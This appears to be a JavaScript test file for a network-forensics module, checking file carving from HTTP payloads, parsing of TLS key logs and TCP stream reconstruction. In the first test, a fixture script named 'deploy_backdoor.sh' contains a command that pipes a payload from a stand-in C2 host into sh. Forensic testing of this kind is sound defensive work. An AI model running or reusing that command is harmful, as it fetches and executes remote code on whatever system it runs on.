import fs from 'node:fs/promises';
import path from 'node:path';
import os from 'node:os';
import {
  carveFilesFromPayload,
  ingestTlsSessionKeys,
  reconstructTcpStreams,
  generateFlowLadder,
  listCarvedFiles
} from '../src/engine/forensics.js';

async function runTests() {
  console.log('🧪 Testing Deep PCAP Forensic Extraction & Protocol Reconstruction...');

  // Setup isolated XDG config home
  const tempDir = await fs.mkdtemp(path.join(os.tmpdir(), 'vigilante-test-forensics-'));
  process.env.XDG_CONFIG_HOME = tempDir;

  // Test 1: Carve HTTP executable / script payload
  const rawHttpPayload = `HTTP/1.1 200 OK
Content-Type: application/x-sh
Content-Disposition: attachment; filename="deploy_backdoor.sh"
Content-Length: 58

#!/bin/bash
curl -s http://c2.malicious.org/stage2.bin | sh
`;

  const carved = await carveFilesFromPayload(rawHttpPayload);
  if (carved.length !== 1) throw new Error(`Expected 1 carved file, got: ${carved.length}`);
  const file1 = carved[0];
  if (file1.filename !== 'deploy_backdoor.sh') throw new Error(`Expected filename deploy_backdoor.sh, got: ${file1.filename}`);
  if (!file1.sha256 || !file1.md5) throw new Error('Missing file hashes');
  console.log(`✔ Test 1 passed: HTTP file carved (${file1.filename}, ${file1.sizeBytes} bytes, SHA256: ${file1.sha256.substring(0, 10)}...).`);

  // Test 2: Ingest TLS Session Secrets (SSLKEYLOGFILE)
  const sslKeyLog = `# SSL/TLS secrets log file
CLIENT_RANDOM 6bb2e5414d48d3db092f6d0f62ea98c56fa9044d03975ba66ea34ddfe231f24d 1b3e8e7c10b777a8335f49e0b83e390299f2e3a8904791e8460627d35368a5c37e6da48bbec5a38a7c1b525f0e1bc128
CLIENT_HANDSHAKE_TRAFFIC_SECRET 98f1a4e5264b971ca2eb05d92e7c18a2468f760e1d53c89012479f6ebac1048b 4a79b20e1837c4d5e76a91f82c3e4a5b6c7d8e9f0123456789abcdef01234567
`;

  const parsedKeys = ingestTlsSessionKeys(sslKeyLog);
  if (parsedKeys.length !== 2) throw new Error(`Expected 2 TLS keys, got: ${parsedKeys.length}`);
  console.log(`✔ Test 2 passed: Parsed ${parsedKeys.length} TLS Session Secrets for stream decryption.`);

  // Test 3: Reconstruct TCP Streams
  const mockPackets = [
    { srcIp: '10.42.0.77', srcPort: 48992, dstIp: '10.42.0.88', dstPort: 445, flags: 'SYN', length: 64 },
    { srcIp: '10.42.0.88', srcPort: 445, dstIp: '10.42.0.77', dstPort: 48992, flags: 'SYN-ACK', length: 64 },
    { srcIp: '10.42.0.77', srcPort: 48992, dstIp: '10.42.0.88', dstPort: 445, flags: 'ACK', length: 54 },
    { srcIp: '10.42.0.77', srcPort: 48992, dstIp: '10.42.0.88', dstPort: 445, flags: 'PSH-ACK', length: 512, payload: 'SMB2_WRITE_PAYLOAD:malware_bytes' },
    { srcIp: '10.42.0.88', srcPort: 445, dstIp: '10.42.0.77', dstPort: 48992, flags: 'FIN-ACK', length: 54 }
  ];

  const streams = reconstructTcpStreams(mockPackets);
  if (streams.length !== 1) throw new Error(`Expected 1 TCP stream, got: ${streams.length}`);
  const s = streams[0];
  if (s.packetsCount !== 5 || s.bytesTransferred !== 748) {
    throw new Error(`Unexpected stream metrics: ${s.packetsCount} pkts, ${s.bytesTransferred} bytes`);
  }
  console.log(`✔ Test 3 passed: Reconstructed TCP stream [${s.streamId}] (5 packets, 748 bytes transferred).`);

  // Test 4: Generate Flow Ladder Diagram
  const ladder = generateFlowLadder(s);
  if (!ladder.includes('TCP FLOW LADDER DIAGRAM') || !ladder.includes('PSH-ACK')) {
    throw new Error('Invalid flow ladder diagram');
  }
  console.log('✔ Test 4 passed: Flow ladder sequence diagram rendered.');

  // Test 5: List Carved Files
  const allCarved = await listCarvedFiles();
  if (allCarved.length !== 1) throw new Error(`Expected 1 carved file in registry, got: ${allCarved.length}`);
  console.log(`✔ Test 5 passed: listCarvedFiles returned ${allCarved.length} forensic artifact.`);

  console.log('🎉 ALL 5 PCAP FORENSICS TESTS PASSED SUCCESSFULLY!\n');
}

runTests().catch(err => {
  console.error('❌ Forensics test failure:', err);
  process.exit(1);
});
